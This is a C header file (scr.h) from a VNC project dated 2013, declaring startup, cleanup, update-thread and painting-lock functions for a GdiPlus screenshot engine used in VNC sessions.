//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
// VNC project. Version 1.9.17.3
//	
// module: scr.h
// $Revision: 137 $
// $Date: 2013-07-23 16:57:05 +0400 (Вт, 23 июл 2013) $
// description:
//	GdiPlus support module. Screenshot generation engine.

WINERROR ScrStartup(void);
void ScrCleanup(void);	

WINERROR ScrStartUpdateThread(PVNC_SESSION pSession);
void ScrStopUpdateThread(PVNC_SESSION pSession);

void ScrLockPainting(PVNC_SESSION pSession);
void ScrUnlockPainting(PVNC_SESSION pSession);
